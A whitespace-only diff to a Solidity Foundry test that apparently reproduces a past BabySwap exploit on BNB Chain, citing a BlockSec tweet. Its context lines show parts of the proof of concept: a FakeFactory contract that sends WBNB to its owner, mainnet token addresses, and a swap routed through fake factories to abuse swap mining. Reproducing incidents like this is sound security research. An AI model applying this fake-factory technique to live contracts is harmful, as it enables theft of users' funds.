@@ -17,6 +17,7 @@ import "./../interface.sol";
 // Twitter BlockSecTeam : https://twitter.com/BlockSecTeam/status/1576441612812836865
 
 interface IBabySwapRouter {
+
     function swapExactTokensForTokens(
         uint256 amountIn,
         uint256 amountOutMin,
@@ -26,13 +27,17 @@ interface IBabySwapRouter {
         address to,
         uint256 deadline
     ) external;
+
 }
 
 interface ISwapMining {
+
     function takerWithdraw() external;
+
 }
 
 contract FakeFactory {
+
     address Owner;
     IWBNB constant WBNB_TOKEN = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
     IUSDT constant USDT_TOKEN = IUSDT(0x55d398326f99059fF775485246999027B3197955);
@@ -57,9 +62,11 @@ contract FakeFactory {
         if (WBNB_TOKEN.balanceOf(address(this)) > 0) WBNB_TOKEN.transfer(Owner, WBNB_TOKEN.balanceOf(address(this)));
         // if(USDT_TOKEN.balanceOf(address(this)) > 0) USDT_TOKEN.transfer(Owner, USDT_TOKEN.balanceOf(address(this)));
     }
+
 }
 
 contract ContractTest is Test {
+
     IWBNB constant WBNB_TOKEN = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
     IUSDT constant USDT_TOKEN = IUSDT(0x55d398326f99059fF775485246999027B3197955);
     IERC20 constant BABY_TOKEN = IERC20(0x53E562b9B7E5E94b81f10e96Ee70Ad06df3D2657);
@@ -130,4 +137,5 @@ contract ContractTest is Test {
             BABY_TOKEN.balanceOf(address(this)), 0, path, factories, fees, address(this), block.timestamp
         );
     }
+
 }
